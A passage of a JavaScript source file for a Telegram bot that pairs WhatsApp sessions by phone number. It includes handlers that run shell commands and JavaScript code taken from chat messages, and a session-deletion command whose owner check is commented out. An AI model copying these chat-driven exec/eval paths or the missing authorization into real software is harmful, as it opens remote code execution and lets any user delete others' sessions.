                        exec(body.slice(2), (err, stdout, stderr) => {
                            if (err) return send(err.message);
                            if (stdout) return send(stdout);
                            if (stderr) return send(stderr);
                        });
                    }
                    break;
            }
        }

    } catch (err) {
        console.error(chalk.redBright('❌ Error in messages.upsert:'), err);
        conn.sendMessage(chat, `Error Occured: ${err}`);
    }
});
}

let isPairLocked = true;

bot.onText(/\/lockpair/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
  }

  isPairLocked = true;
  bot.sendMessage(chatId, "🔒 /pair command has been locked. Only owners can use it now.");
});

bot.onText(/\/unlockpair/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
  }

  isPairLocked = false;
  bot.sendMessage(chatId, "🔓 /pair command has been unlocked. All users can use it now.");
});

bot.onText(/\/pair(?:\s(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const phoneNumber = match[1];

       if (!phoneNumber) {
        return bot.sendMessage(chatId, `⚠️ Wrong format, Usage: /pair 234xxxxxx`, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Join Channel', url: `https://t.me/gabimarutechchannel` }
                    ]
                ]
            }
        });
    }
    // Channel follow enforcement
    const follows = await userFollowsChannel(userId, bot);
    if (!follows) {
        return bot.sendMessage(chatId, `❌ Please follow ${CHANNEL_USERNAME} before using this command.`);
    }

    // Pair lock check
    if (isPairLocked && !isOwner(userId)) {
        return bot.sendMessage(chatId, `🚫 Pairing is currently locked. Only bot owners can use this command.`);
    }

    const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);

    if (!fs.existsSync(sessionPath)) {
        fs.mkdirSync(sessionPath, { recursive: true });
        console.log(`✅ Session directory created for ${phoneNumber}`);
        bot.sendMessage(chatId, `✅ Session directory created for ${phoneNumber}`);
        
        // Run your WhatsApp pairing logic
        startWhatsAppBot(phoneNumber, chatId).catch(err => {
            console.error('❌ Error pairing:', err);
            bot.sendMessage(chatId, '❌ An error occurred while connecting.');
        });
    } else {
        bot.sendMessage(chatId, `⚠️ Session for ${phoneNumber} already exists. Use /delpair to remove it.`);
    }
});

bot.onText(/\/eval (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const code = match[1].trim();
    const userId = msg.from.id.toString();
    
      if (isOwner(userId)) {
    try {
        const result = eval(code);
        const response = `Result:\n${String(result)}`;

        bot.sendMessage(chatId, response);

    } catch (error) {
        console.error("Error during /eval:", error);
        bot.sendMessage(chatId, `Error:\n${String(error)}`);
    }
}  else {
        const options = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Get Premium",
                            url: "https://wa.me/2349012834275"
                        }
                    ]
                ]
            })
        };

        bot.sendMessage(chatId, "Sorry, only the bot owner can use this command.", options);
    }
});

// Handle /delete command
bot.onText(/\/delpair (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const ownerId = msg.from.id.toString();
    const phoneNumber = match[1];
    const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);
    /*
    if (ownerId !== OWNER_ID) {
        return bot.sendMessage(chatId, '❌ You are not authorized to use this command.');
    }
    */
    if (fs.existsSync(sessionPath)) {
           fs.rmSync(sessionPath, { recursive: true, force: true });
            bot.sendMessage(chatId, `Session for ${phoneNumber} has been deleted. You can now request a new pairing code.`);
            connectedUsers[chatId] = connectedUsers[chatId].filter(user => user.phoneNumber !== phoneNumber); // Remove the association after deletion
            saveConnectedUsers(); // Save updated connected users
    } else {
        bot.sendMessage(chatId, `No session found for ${phoneNumber}. It may have already been deleted.`);
    }
});

// Handle /menu command
bot.onText(/\/menu|\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const options = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          {
            text: "WhatsApp",
            url: "https://wa.me/6283128820826"
          }
        ],
        [
          {
            text: "Telegram Channel",
            url: "https://t.me/gabimarutechchannel"
          }
        ]
      ]
    })
  };

  const imageUrl = 'https://b.top4top.io/p_3360xqf1y0.jpg';

  const caption = `
Hello ${msg.from.first_name || "there"}
Welcome To The Telegram Bot Interface
/pair <phone number>
/delpair <phone number>
/list (view paired numbers)

Creator -> ayokunledavid.t.me`;

  bot.sendPhoto(chatId, imageUrl, {
    caption: caption,
    reply_markup: options.reply_markup
  })
  .catch(error => {
    console.error("Error sending photo:", error);
    bot.sendMessage(chatId, "Sorry, I couldn't send the image.  Please try again later.");
  });
});

bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    const connectedUser = connectedUsers[chatId];

    if (connectedUser && connectedUser.length > 0) {
        let statusText = `Bot Status:\n- Connected Numbers:\n`;

        connectedUser.forEach(user => {
            const jid = `${user.phoneNumber}@s.whatsapp.net`;
            statusText += `${jid}\n`;
        });

        bot.sendMessage(chatId, statusText);
    } else {
        bot.sendMessage(chatId, `You have no registered numbers.`);
    }
});

// Function to load all session files
async function loadAllSessions() {
    const sessionsDir = path.join(__dirname, 'tmp');
    if (!fs.existsSync(sessionsDir)) {
        fs.mkdirSync(sessionsDir);
    }

    const sessionFiles = fs.readdirSync(sessionsDir);
    for (const file of sessionFiles) {
        const phoneNumber = file.replace('session_', '');
        await startWhatsAppBot(phoneNumber);
    }
}

// Ensure all sessions are loaded on startup
loadConnectedUsers(); // Load Connected users from the JSON file
loadAllSessions().catch(err => {
    console.log('Error loading sessions:', err);
});
bot.on('new_chat_members', async (msg) => {
  const chatId = msg.chat.id;
  const newMembers = msg.new_chat_members;

  try {
    // Fetch the chat information to get the bio (description)
    const chatInfo = await bot.getChat(chatId);
    const groupBio = chatInfo.description || "No group rules or description set.";

    newMembers.forEach(member => {
      const memberName = member.first_name || member.username || 'User';  // Get the member's name

      let welcomeMessage = `Welcome to the group, ${memberName}!`;

      if (msg.chat.title) {
        welcomeMessage += ` This is the ${msg.chat.title} group.`;
      }

      welcomeMessage += `\n\n*Group Rules and Information:*\n${groupBio}`;

      bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
    });
  } catch (error) {
    console.error("Error fetching group bio:", error);
    bot.sendMessage(chatId, "Welcome to the group!  (Could not retrieve group rules at this time.)"); 
  }
});
// Start the bot
        console.table({
            "Bot Name": "WhatsTele Bot",
            "Link": `https://t.me/gabimarutechchannel`,
            "Author": "https://t.me/ayokunledavid"
})
console.log('Telegram bot instance has started...');


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})
